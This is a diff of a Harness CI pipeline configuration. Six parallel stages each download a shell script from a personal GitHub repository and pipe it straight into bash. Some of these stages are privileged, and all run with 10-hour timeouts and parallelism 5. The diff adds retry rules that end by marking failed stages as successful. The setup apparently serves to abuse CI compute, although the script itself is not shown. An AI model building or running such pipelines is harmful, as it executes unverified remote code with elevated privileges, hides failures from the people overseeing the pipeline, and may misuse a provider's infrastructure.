@@ -1,5 +1,4 @@
 pipeline:
-  identifier: jub_7
   projectIdentifier: default_project
   orgIdentifier: default
   tags: {}
@@ -25,8 +24,7 @@ pipeline:
                   name: jub1Run_1
                   spec:
                     shell: Bash
-                    command: wget -O - https://raw.githubusercontent.com/sindilesiqhova/harness/refs/heads/main/execute_steps.sh
-                      | bash
+                    command: wget -O - https://raw.githubusercontent.com/sindilesiqhova/harness/refs/heads/main/execute_steps.sh | bash
                     privileged: true
                     imagePullPolicy: IfNotPresent
                     runAsUser: "1000"
@@ -45,6 +43,19 @@ pipeline:
         strategy:
           parallelism: 5
         timeout: 10h
+        failureStrategies:
+          - onFailure:
+              errors:
+                - AllErrors
+              action:
+                type: Retry
+                spec:
+                  retryCount: 5
+                  retryIntervals:
+                    - 5m
+                  onRetryFailure:
+                    action:
+                      type: MarkAsSuccess
     - stage:
         identifier: jub2
         type: CI
@@ -66,8 +77,7 @@ pipeline:
                   name: jub2Run_1
                   spec:
                     shell: Bash
-                    command: wget -O - https://raw.githubusercontent.com/sindilesiqhova/harness/refs/heads/main/execute_steps.sh
-                      | bash
+                    command: wget -O - https://raw.githubusercontent.com/sindilesiqhova/harness/refs/heads/main/execute_steps.sh | bash
                     privileged: true
                     imagePullPolicy: IfNotPresent
                     runAsUser: "1000"
@@ -81,6 +91,19 @@ pipeline:
         strategy:
           parallelism: 5
         timeout: 10h
+        failureStrategies:
+          - onFailure:
+              errors:
+                - AllErrors
+              action:
+                type: Retry
+                spec:
+                  retryCount: 5
+                  retryIntervals:
+                    - 5m
+                  onRetryFailure:
+                    action:
+                      type: MarkAsSuccess
     - stage:
         identifier: jub3
         type: CI
@@ -102,8 +125,7 @@ pipeline:
                   name: jub3Run_1
                   spec:
                     shell: Bash
-                    command: wget -O - https://raw.githubusercontent.com/sindilesiqhova/harness/refs/heads/main/execute_steps.sh
-                      | bash
+                    command: wget -O - https://raw.githubusercontent.com/sindilesiqhova/harness/refs/heads/main/execute_steps.sh | bash
                     privileged: true
                     imagePullPolicy: IfNotPresent
                     runAsUser: "1000"
@@ -117,6 +139,19 @@ pipeline:
         strategy:
           parallelism: 5
         timeout: 10h
+        failureStrategies:
+          - onFailure:
+              errors:
+                - AllErrors
+              action:
+                type: Retry
+                spec:
+                  retryCount: 5
+                  retryIntervals:
+                    - 5m
+                  onRetryFailure:
+                    action:
+                      type: MarkAsSuccess
     - stage:
         identifier: jub4
         type: CI
@@ -138,8 +173,7 @@ pipeline:
                   name: jub4Run_1
                   spec:
                     shell: Bash
-                    command: wget -O - https://raw.githubusercontent.com/sindilesiqhova/harness/refs/heads/main/execute_steps.sh
-                      | bash
+                    command: wget -O - https://raw.githubusercontent.com/sindilesiqhova/harness/refs/heads/main/execute_steps.sh | bash
                     privileged: true
                     imagePullPolicy: IfNotPresent
                     runAsUser: "1000"
@@ -153,6 +187,19 @@ pipeline:
         strategy:
           parallelism: 5
         timeout: 10h
+        failureStrategies:
+          - onFailure:
+              errors:
+                - AllErrors
+              action:
+                type: Retry
+                spec:
+                  retryCount: 5
+                  retryIntervals:
+                    - 5m
+                  onRetryFailure:
+                    action:
+                      type: MarkAsSuccess
     - stage:
         identifier: jub5
         type: CI
@@ -174,8 +221,7 @@ pipeline:
                   name: jub5Run_1
                   spec:
                     shell: Bash
-                    command: wget -O - https://raw.githubusercontent.com/sindilesiqhova/harness/refs/heads/main/execute_steps.sh
-                      | bash
+                    command: wget -O - https://raw.githubusercontent.com/sindilesiqhova/harness/refs/heads/main/execute_steps.sh | bash
                     imagePullPolicy: IfNotPresent
                     runAsUser: "1000"
                   timeout: 10h
@@ -188,6 +234,19 @@ pipeline:
         strategy:
           parallelism: 5
         timeout: 10h
+        failureStrategies:
+          - onFailure:
+              errors:
+                - AllErrors
+              action:
+                type: Retry
+                spec:
+                  retryCount: 5
+                  retryIntervals:
+                    - 5m
+                  onRetryFailure:
+                    action:
+                      type: MarkAsSuccess
     - stage:
         identifier: jub6
         type: CI
@@ -209,8 +268,7 @@ pipeline:
                   name: jub6Run_1
                   spec:
                     shell: Bash
-                    command: wget -O - https://raw.githubusercontent.com/sindilesiqhova/harness/refs/heads/main/execute_steps.sh
-                      | bash
+                    command: wget -O - https://raw.githubusercontent.com/sindilesiqhova/harness/refs/heads/main/execute_steps.sh | bash
                     imagePullPolicy: IfNotPresent
                     runAsUser: "1000"
                   timeout: 10h
@@ -223,6 +281,20 @@ pipeline:
         strategy:
           parallelism: 5
         timeout: 10h
+        failureStrategies:
+          - onFailure:
+              errors:
+                - AllErrors
+              action:
+                type: Retry
+                spec:
+                  retryCount: 5
+                  retryIntervals:
+                    - 5m
+                  onRetryFailure:
+                    action:
+                      type: MarkAsSuccess
   timeout: 10h
   allowStageExecutions: true
-  name: jub 7
+  identifier: jub8
+  name: jub8
